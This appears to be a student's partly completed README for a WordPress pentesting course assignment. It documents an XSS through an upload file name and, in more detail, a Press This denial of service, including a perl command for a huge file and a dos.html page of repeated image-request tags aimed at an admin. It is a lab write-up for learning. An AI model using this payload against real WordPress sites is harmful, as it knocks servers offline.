
# Project 7 - WordPress Pentesting

Time spent: **6** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) Vulnerability Name or ID 8819
  - [ ] Summary: Inject a malicious script in to the filename which a victim tries to upload leading to XSS inside the administrators control panel.
  Two different "file to large" cases end up in interpolating the file name and appending it into DOM unsanitized leading to XSS.
    - Vulnerability types:injecting a scpript 
    - Tested in version: 
    - Fixed in version: 
  - [ ] GIF Walkthrough: 8819.gif
  - [ ] Steps to recreate: step 1: downloading a 20mb file
  2. Changing file name in order to expoloit it
  3. upload it to http://localhost/wp-admin/media-new.php
  - [ ] Affected source code:
    - [Link 1](https://hackerone.com/reports/203515)
    
    
2. (Required) Vulnerability Name or ID 8770
  - [ ] Summary: 
The Press This [4] function allows quick publishing with a special web
browser bookmarklet. An admin can also visit the Press This page
directly. One of the features of Press This is scanning an external
server for embeddable content. This is done with a GET request to:

https://www.securify.nl/wp-admin/press-this.php?u=<URL>&url-scan-submit=Scan

When this URL is called, Press This will download the contents located
at "URL" and look for content such as images and other embeddable
elements.
 This property can be abused by setting the
external URL to a huge file and have an authenticated admin visit it.
The PHP process will use 100% of its CPU resources to process the file.
If an authenticated admin can be lured to an external page, then the
malicious URL can be called many times, blocking all PHP server threads.
This will cause the server to be unreachable for a while.
    - Vulnerability types: DDOS
    - Tested in version: 
    - Fixed in version: 
  - [ ] GIF Walkthrough: 8770.gif
  - [ ] Steps to recreate:  
1. Install plug in Press This
2. Send get request on press this
3. On an external server, create a large text file with the command:
perl -e 'print "<>"x28000000' > foo.txt
4.Create a file dos.html on the external server with enough entries
to fill the connection pool of the WordPress server, as follows:
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=b'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=c'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=d'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=e'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=f'>
<img src='http://<wp
server>/wp-admin/press-this.php?u=http%3A%2F%2F<external
server>%2Ffoo.txt&url-scan-submit=Scan&a=g'>
[..]
(replace <wp server> with the WordPress server address and <external
server> with the external server)
  5. Now have a logged in admin visit dos.html. The server will be down for a
while.
  - [ ] Affected source code: https://hackerone.com/reports/153093
    - [Link 1](https://github.com/WordPress/WordPress/commit/263831a72d08556bc2f3a328673d95301a152829)
  
  
3. (Required) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
    
    
    
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

dos.html, dos, 

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

All of these challenges are very hard to find and follow as I am a Fincanca major with zero computing and linux background.
## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
